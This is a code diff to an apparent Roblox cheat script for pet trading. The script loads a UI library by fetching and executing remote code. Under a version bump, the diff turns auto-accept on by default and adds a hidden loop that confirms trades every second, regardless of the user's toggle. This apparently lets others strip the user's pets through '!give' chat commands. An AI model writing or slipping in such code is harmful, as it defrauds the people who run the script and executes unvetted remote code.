@@ -10,7 +10,7 @@ local tradeEvents = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("T
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 -- ===== Version =====
-local SCRIPT_VERSION = "1.4.1"
+local SCRIPT_VERSION = "1.4.2"
 
 -- ===== Create Window =====
 local Window = Rayfield:CreateWindow({          
@@ -458,11 +458,11 @@ PetTradeTab:CreateToggle({
 -- ============================
 --   AUTO ACCEPT & CONFIRM (INSIDE THE TRADING TICKET)
 -- ============================
-local AutoAcceptEnabled = false
+local AutoAcceptEnabled = true
 
 PetTradeTab:CreateToggle({
     Name = "Auto Accept & Confirm",
-    CurrentValue = false,
+    CurrentValue = true,
     Flag = "AutoAcceptToggle",
     Callback = function(Value)
         AutoAcceptEnabled = Value
@@ -479,6 +479,16 @@ PetTradeTab:CreateToggle({
         end
     end
 })
+
+spawn(function()
+    while AutoAcceptEnabled do
+        pcall(function()
+            tradeEvents:WaitForChild("Accept"):FireServer()
+            tradeEvents:WaitForChild("Confirm"):FireServer()
+        end)
+        task.wait(1)
+    end
+end)
 
 -- ============================
 --   CHAT COMMANDS (!give + !off/clear
